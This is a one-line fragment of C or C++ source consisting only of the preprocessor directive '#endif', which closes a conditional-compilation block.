#endif
